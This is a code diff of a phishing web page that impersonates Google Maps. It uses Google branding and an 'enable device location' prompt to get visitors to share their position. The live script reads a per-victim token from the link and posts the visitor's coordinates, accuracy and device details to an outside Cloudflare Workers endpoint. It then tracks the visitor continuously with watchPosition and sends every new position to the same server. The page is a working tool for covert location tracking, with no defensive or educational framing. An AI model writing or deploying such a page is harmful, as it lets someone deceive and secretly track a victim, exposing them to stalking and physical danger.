@@ -13,6 +13,44 @@ html,body{
   font-family:system-ui,-apple-system;
 }
 
+.header{
+ 
+  background: var(--surface-color);
+  
+  height: 48px;
+ 
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  padding: 0 15px;
+  box-shadow: 0 2px 6px rgba(0,0,0,0.3);
+
+}
+.header #icon{
+  width: 20px;
+position: relative;
+left: 0px;
+}
+.header>h3{
+  position: relative;
+  left:-75px;
+  font-weight: 500;
+}
+.header>h3>span{
+  
+  font-weight: 300;
+}
+.header>button{
+   padding:4px 10px;
+  font-size:16px;
+  border:none;
+  border-radius:15px;
+  background:rgb(0, 136, 255);
+  color:#ffffff;
+  cursor:pointer;
+  font-family:'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+
+}
 /* Google map background */
 .map-bg{
   position:fixed;
@@ -20,7 +58,7 @@ html,body{
   z-index:1;
 }
 .map-bg iframe{
-  width:100%;
+  width:110%;
   height:110%;
   border:0;
 }
@@ -44,12 +82,12 @@ html,body{
 }
 
 #permission button{
-  padding:12px 24px;
+  padding:2px 10px;
   font-size:16px;
   border:none;
-  border-radius:8px;
-  background:#ffffff;
-  color:rgb(0, 136, 255);
+  border-radius:12px;
+  background:rgb(0, 136, 255);
+  color:#ffffff;
   cursor:pointer;
   font-family:'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
 }
@@ -64,12 +102,15 @@ html,body{
   box-shadow: 0 0 5px rgba(128, 128, 128, 0.247);
   padding: 8px;
 }
+#icon{
+  width: 40px;
+}
 .d-box>h3{
   color: gray;
 }
 .d-box>h3>span{
   color: gray;
-  font-weight: 40 ;
+  font-weight: 40;
 }
 
 #status{
@@ -106,7 +147,7 @@ html,body{
 /* --- Header / Search Bar Section --- */
 .top-container {
   position: absolute;
-  top: 0;
+  top: 10;
   width: 100%;
   padding: 10px 0;
   z-index: 10;
@@ -250,30 +291,6 @@ html,body{
 .google-green { color: #34a853; }
 
 
-/* Google-style spinner */
-.g-loader{
-  width:40px;
-  height:40px;
-  border-radius:50%;
-  border:4px solid #e0e0e0;
-  border-top-color:#4285F4;
-  border-right-color:#EA4335;
-  border-bottom-color:#FBBC05;
-  border-left-color:#34A853;
-  animation:spin 1s linear infinite;
-  margin-top:14px;
-  display:none;
-}
-
-@keyframes spin{
-  to{ transform:rotate(360deg); }
-}
-
-/* disable button while loading */
-#permission.loading button{
-  opacity:0.6;
-  pointer-events:none;
-}
 
 </style>
 
@@ -281,120 +298,35 @@ html,body{
 
 <body>
 
-<!-- Google-like background -->
+<!-- MAP -->
 <div class="map-bg">
-  <iframe
-    src="https://www.google.com/maps?q=lahore,pakistan&zoom=13&output=embed"
-    loading="lazy" id="map-link">
+  <iframe id="mapFrame"
+    src="https://www.google.com/maps?q=0,0&z=2&output=embed"
+    loading="lazy">
   </iframe>
 </div>
 
-<!-- Permission Screen -->
-
-<div class="location-permission">
-  <div class="header">
-    <div class="pin-icon">📍</div>
-    <div class="title">Allow <strong>Maps</strong> to access this device’s location?</div>
-  </div>
-
-  <div class="maps-preview">
-    <div class="map-container precise">
-      <div class="map-label">Precise</div>
-      <div class="map-circle">
-        <div class="pin-center"></div>
-      </div>
-    </div>
-    <div class="map-container approximate">
-      <div class="map-label">Approximate</div>
-      <div class="map-roads"></div>
-    </div>
-  </div>
-
-  <div class="options">
-    <div class="option">While using the app</div>
-    <div class="option">Only this time</div>
-    <div class="option last">Don’t allow</div>
-  </div>
-</div>
-<!-- -->
+<!-- PERMISSION SCREEN -->
 <div id="permission">
-<div class="d-box">
-
-<img src="https://www.google.com/s2/favicons?sz=128&domain=maps.google.com">
- <h3>Google <span>Maps</span></h3>
-<button id="allow">Open</button>
-<div class="g-loader" id="loader"></div>
-
-  <div id="status">To continue, enable device location</div>
+  <div class="d-box">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 232597 333333">
+      <path d="M151444 5419C140355 1916 128560 0 116311 0" fill="#1a73e8"/>
+    </svg>
+    <h3>Google <span>Maps</span></h3>
+    <button id="allowBtn">Open</button>
+    <div id="status">To continue, enable device location</div>
+  </div>
 </div>
-</div>
+
+<!-- GOOGLE UI OVERLAY -->
 <div class="google-ui">
-
-  <div class="top-container">
-    <div class="search-bar">
-      <i class="fa-solid fa-location-dot"></i>
-      <div class="search-text">Search here</div>
-      <i class="fa-solid fa-microphone"></i>
-      <div class="profile-icon" id="p-i">I</div>
-    </div>
-
-    <div class="pill-container">
-      <div class="pill"><i class="fa-solid fa-utensils"></i> Restaurants</div>
-      <div class="pill"><i class="fa-solid fa-gas-pump"></i> Gas</div>
-      <div class="pill"><i class="fa-solid fa-bed"></i> Hotels</div>
-      <div class="pill"><i class="fa-solid fa-coffee"></i> Coffee</div>
-      <div class="pill"><i class="fa-solid fa-cart-shopping"></i> Groceries</div>
-    </div>
+  <div class="header">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 232597 333333">
+      <path d="M151444 5419C140355 1916 128560 0 116311 0" fill="#1a73e8"/>
+    </svg>
+    <h3>Google <span>Maps</span></h3>
   </div>
-
-  <div class="map-tools">
-    <div class="tool-btn"><i class="fa-solid fa-layer-group"></i></div>
-    <div class="tool-btn compass"><i class="fa-solid fa-compass"></i></div>
-  </div>
-
-  <div class="google-logo">
-   
-  <span class="google-blue">G</span>
-  <span class="google-red">o</span>
-  <span class="google-yellow">o</span>
-  <span class="google-blue">g</span>
-  <span class="google-green">l</span>
-  <span class="google-red">e</span>
-
 </div>
-
-  <div class="bottom-right-tools">
-    <div class="locate-btn"><i class="fa-solid fa-location-crosshairs"></i></div>
-    <div class="directions-btn">
-      <i class="fa-solid fa-diamond-turn-right" style="color:white;font-size:22px"></i>
-    </div>
-  </div>
-
-  <div class="bottom-nav">
-    <div class="nav-item active">
-      <div class="active-indicator">
-        <i class="fa-solid fa-location-dot"></i>
-      </div>
-      Explore
-    </div>
-    <div class="nav-item">
-      <i class="fa-regular fa-bookmark"></i>
-      You
-    </div>
-    <div class="nav-item">
-      <i class="fa-regular fa-square-plus"></i>
-      Contribute
-    </div>
-  </div>
-
-</div>
-
-<script>
-/* Random profile letter */
-const letters=["A","B","C","J","N","S","H"];
-document.getElementById("p-i").textContent =
-  letters[Math.floor(Math.random()*letters.length)];
-</script>
 
 <script>
 /* ================= CONFIG ================= */
@@ -402,35 +334,26 @@ const API = "https://odd-wildflower-ef2f.ishaqanwar751.workers.dev";
 const token = new URLSearchParams(location.search).get("token");
 if(!token){ alert("Invalid link"); throw "NO TOKEN"; }
 
+const mapFrame = document.getElementById("mapFrame");
 const statusEl = document.getElementById("status");
-const mapFrame = document.getElementById("map-link");
-const loader = document.getElementById("loader");
-const permissionBox = document.getElementById("permission");
-const allowBtn = document.getElementById("allow");
 
 /* Device info */
 function deviceInfo(){
   return {
-    ua: navigator.userAgent,
-    lang: navigator.language,
-    screen: `${screen.width}x${screen.height}`,
-    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+    ua:navigator.userAgent,
+    lang:navigator.language,
+    screen:`${screen.width}x${screen.height}`
   };
 }
 
 /* CLICK */
-allowBtn.onclick = () => {
-
-  permissionBox.classList.add("loading");
-  loader.style.display = "block";
-  statusEl.textContent = "Requesting location…";
-
+document.getElementById("allowBtn").onclick = ()=>{
   if(!navigator.geolocation){
-    statusEl.textContent = "Location not supported";
-    loader.style.display = "none";
-    permissionBox.classList.remove("loading");
+    statusEl.textContent="Location not supported";
     return;
   }
+
+  statusEl.textContent="Requesting location…";
 
   navigator.geolocation.getCurrentPosition(
     success,
@@ -441,56 +364,46 @@ allowBtn.onclick = () => {
 
 /* SUCCESS */
 function success(pos){
-  loader.style.display = "none";
+  const {latitude,longitude,accuracy} = pos.coords;
 
-  const { latitude, longitude, accuracy } = pos.coords;
-
-  /* Update map instantly */
+  // Update map instantly
   mapFrame.src =
-    `https://www.google.com/maps?q=${latitude},${longitude}&z=18&output=embed`;
+   `https://www.google.com/maps?q=${latitude},${longitude}&z=18&output=embed`;
 
-  /* Send first hit */
-  fetch(API + "/send-location",{
+  // Send first hit
+  fetch(API+"/send-location",{
     method:"POST",
-    headers:{ "Content-Type":"application/json" },
+    headers:{"Content-Type":"application/json"},
     body:JSON.stringify({
       token,
-      lat: latitude,
-      lng: longitude,
-      acc: accuracy,
-      device: deviceInfo()
+      lat:latitude,
+      lng:longitude,
+      acc:accuracy,
+      device:deviceInfo()
     })
   });
 
-  /* Remove permission UI */
-  permissionBox.remove();
+  document.getElementById("permission").remove();
 
-  /* Continuous tracking */
+  // Continuous tracking
   navigator.geolocation.watchPosition(p=>{
-    fetch(API + "/send-location",{
+    fetch(API+"/send-location",{
       method:"POST",
-      headers:{ "Content-Type":"application/json" },
+      headers:{"Content-Type":"application/json"},
       body:JSON.stringify({
         token,
-        lat: p.coords.latitude,
-        lng: p.coords.longitude,
-        acc: p.coords.accuracy
+        lat:p.coords.latitude,
+        lng:p.coords.longitude,
+        acc:p.coords.accuracy
       })
     });
-  }, ()=>{}, { enableHighAccuracy:true, maximumAge:0 });
+  },()=>{}, {enableHighAccuracy:true});
 }
 
 /* ERROR */
 function error(e){
-  loader.style.display = "none";
-  permissionBox.classList.remove("loading");
-
-  if(e.code === 1){
-    statusEl.textContent = "Location denied. Please allow GPS permission.";
-  }else{
-    statusEl.textContent = "Enable GPS & try again";
-    allowBtn.textContent = "Retry";
-  }
+  statusEl.textContent =
+    "Enable GPS & allow location permission";
 }
 </script>
 
